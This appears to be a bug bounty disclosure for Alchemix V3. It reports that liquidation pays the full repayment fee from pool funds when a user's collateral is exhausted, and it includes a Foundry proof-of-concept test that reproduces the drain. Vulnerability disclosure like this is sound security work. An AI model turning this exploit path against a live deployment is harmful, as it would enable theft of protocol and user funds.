# 58464 sc critical repayment fee paid from protocol funds when user collateral is depleted

**Submitted on Nov 2nd 2025 at 14:06:02 UTC by @auditagent for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58464
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Protocol insolvency

## Description

## Brief/Intro

* `_resolveRepaymentFee` calculates the full fee `(repaidAmount * repaymentFee / BPS)` and transfers that amount to the liquidator.
* The collateral is only debited up to their remaining balance.
* Liquidator receives full repayment fee from pool even when user's collateral couldn't cover it.

The docs claims that the Liquidator Fee Vault only covers fees when the user's collateral can’t pay the liquidator. <https://keenanlukeom.github.io/alchemix-v3-docs/user/concepts/liquidations>. However, this is not how the protocol behaves currently

## Vulnerability Details

1. `_liquidate()` calls `_forceRepay()` to clear earmarked debt using the user's collateral.
2. If the user's debt is fully cleared or position becomes healthy after repayment, the function takes an early-return path that pays a repayment fee.
3. `_resolveRepaymentFee()` computes the fee and deducts only what's available from user collateral:

```solidity
    function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
        Account storage account = _accounts[accountId];
        // calculate repayment fee and deduct from account
        fee = repaidAmountInYield * repaymentFee / BPS;
        account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
        emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
        return fee;
    }
```

4. `_liquidate()` then transfers the full returned fee:

```solidity
feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
return (repaidAmountInYield, feeInYield, 0);
```

The docs mention expected behavior:

> Should the user’s collateral not be sufficient on its own to pay a liquidator, there is a separate fee vault that may be funded by any entity (including the DAO) that may be drawn from to pay liquidators.

However currently the returned `feeInYield` is transferred to the liquidator unconditionally. There is no check to verify the user's collateral was sufficient.

## Impact Details

* Each earmark-only liquidation on an undercollateralized position drains protocol reserves equal to the fee shortfall

## References

* <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol#L900>
* <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol#L840>
* <https://keenanlukeom.github.io/alchemix-v3-docs/user/concepts/liquidations/>

## Proof of Concept

## Proof of Concept

Add the following PoC in `src/test/AlchemistV3.t.sol` and run using `forge test --match-test Liquidate_EarmarkedRepaymentFeeShortfall_ComesFromPool`

```solidity

    function testLiquidate_EarmarkedRepaymentFeeShortfall_ComesFromPool() external {
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount * 2);
        alchemist.deposit(depositAmount, yetAnotherExternalUser, 0);
        vm.stopPrank();

        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
        alchemist.deposit(depositAmount, address(0xbeef), 0);
        uint256 tokenIdFor0xBeef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        
        // Mint maximum debt (90% LTV) so the position is highly leveraged.
        uint256 mintAmount = alchemist.totalValue(tokenIdFor0xBeef) * FIXED_POINT_SCALAR / minimumCollateralization;
        alchemist.mint(tokenIdFor0xBeef, mintAmount, address(0xbeef));
        vm.stopPrank();

        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), mintAmount);
        transmuterLogic.createRedemption(mintAmount);
        vm.stopPrank();

        vm.roll(block.number + 5_256_000);

        (uint256 prevCollateral, uint256 prevDebt, uint256 earmarked) = alchemist.getCDP(tokenIdFor0xBeef);
        require(earmarked == prevDebt, "expected full earmark");

        // Increase supply by ~10.5% → share price drops to ~90.5%, leaving <1% collateral after repayment.
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        uint256 modifiedVaultSupply = initialVaultSupply * 1105 / 1000;  // ≈ +10.5% supply
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        // All relevant balances before liquidation to track fund flows.
        uint256 alchemistMytBalanceBefore = IERC20(address(vault)).balanceOf(address(alchemist));
        uint256 feeVaultBefore = alchemistFeeVault.totalDeposits();
        uint256 liquidatorBalanceBefore = IERC20(address(vault)).balanceOf(address(externalUser));

        console.log("pool balance before", alchemistMytBalanceBefore);
        console.log("fee vault before", feeVaultBefore);
        console.log("liquidator balance before", liquidatorBalanceBefore);

        vm.startPrank(externalUser);
        (, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(tokenIdFor0xBeef);
        vm.stopPrank();

        (uint256 postCollateral,,) = alchemist.getCDP(tokenIdFor0xBeef);
        uint256 alchemistMytBalanceAfter = IERC20(address(vault)).balanceOf(address(alchemist));
        uint256 feeVaultAfter = alchemistFeeVault.totalDeposits();
        uint256 liquidatorBalanceAfter = IERC20(address(vault)).balanceOf(address(externalUser));

        console.log("pool balance after", alchemistMytBalanceAfter);
        console.log("fee vault after", feeVaultAfter);
        console.log("liquidator balance after", liquidatorBalanceAfter);
        console.log("fee in yield", feeInYield);
        console.log("fee in underlying", feeInUnderlying);

        // @audit: shortfall is paid by the protocol not by the user.
        uint256 victimCollateralLoss = prevCollateral - postCollateral;
        uint256 poolDelta = alchemistMytBalanceBefore - alchemistMytBalanceAfter;
        uint256 shortfall = poolDelta > victimCollateralLoss ? poolDelta - victimCollateralLoss : 0;

        console.log("victim collateral loss", victimCollateralLoss);
        console.log("pool delta", poolDelta);
        console.log("shortfall", shortfall);

        vm.assertEq(feeInUnderlying, 0);
        vm.assertGt(feeInYield, 0);
        vm.assertGt(shortfall, 0);
        vm.assertEq(feeVaultAfter, feeVaultBefore);
        vm.assertEq(liquidatorBalanceAfter - liquidatorBalanceBefore, feeInYield);
    }
```
